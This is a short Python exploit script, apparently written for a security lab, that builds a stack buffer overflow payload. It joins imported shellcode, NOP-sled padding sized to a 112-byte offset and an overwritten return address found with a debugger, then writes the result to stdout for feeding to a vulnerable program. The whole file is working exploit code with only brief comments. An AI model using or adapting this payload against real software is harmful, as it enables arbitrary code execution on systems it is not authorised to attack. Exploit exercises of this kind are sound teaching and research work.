import sys
from struct import pack
from shellcode import shellcode

# start address of buffer from $ebp - offset from assembly lea instruction
payload = pack("<I", 0xfff6eccc)
# found vulnerable ret_address by setting a breakpoint and checking $esp
# filled the buffer with shellcode and padding (ret_address - buf_address = 0x70 = 112(dec))
padding = b'\x90' * (112 - len(shellcode))

sys.stdout.buffer.write(shellcode + padding + payload)
